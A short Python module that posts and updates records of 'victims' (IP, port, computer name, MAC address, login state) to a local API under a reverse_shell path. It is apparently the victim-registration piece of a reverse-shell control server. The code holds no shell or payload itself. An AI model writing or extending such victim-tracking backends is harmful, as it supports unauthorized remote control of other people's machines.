import requests


def create_victim(ip, port, computer_name, mac_address):
    data = {
        'ip': ip,
        'port': port,
        'computer_name': computer_name,
        'mac_address': mac_address,
        'logged_in': True,
    }
    response = requests.post('http://127.0.0.1:8000/reverse_shell/api/victims/', data=data)
    return response


def update_victim(mac_address, data):
    response = requests.patch(f'http://127.0.0.1:8000/reverse_shell/api/victims/{mac_address}/', data=data)
    return response
